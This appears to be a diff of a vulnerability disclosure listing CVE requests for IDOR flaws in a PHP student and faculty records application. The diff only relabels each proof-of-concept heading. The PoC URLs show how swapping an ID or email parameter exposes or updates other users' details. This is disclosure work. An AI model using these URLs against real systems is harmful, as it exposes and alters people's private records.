@@ -5,7 +5,7 @@ ___
 # IDOR
 
 ## CVE Request 1928456:
-Poc: 
+Poc IDOR: 
 - /updatedetailsfromstudent.php?eno=146891651#
 - /updatedetailsfromstudent.php?eno=146891652#
 
@@ -16,7 +16,7 @@ Poc:
 ___
 
 ## CVE Request 1928469: 
-Poc: 
+Poc IDOR: 
 - /mydetailsstudent.php?myds=harsh@ics.com
 - /mydetailsstudent.php?myds=rohan@ics.com
   
@@ -28,7 +28,7 @@ Poc:
 ___
 
 ## CVE Request 1928465:
-Poc:
+Poc IDOR:
 - /mydetailsfaculty.php?myfid=102
 - /mydetailsfaculty.php?myfid=101
 
@@ -40,7 +40,7 @@ ___
 
 ## CVE Request 1928471:
 
-Poc:
+Poc IDOR:
 - /updatedetailsfromfaculty.php?myfid=102
 - /updatedetailsfromfaculty.php?myfid=101
 
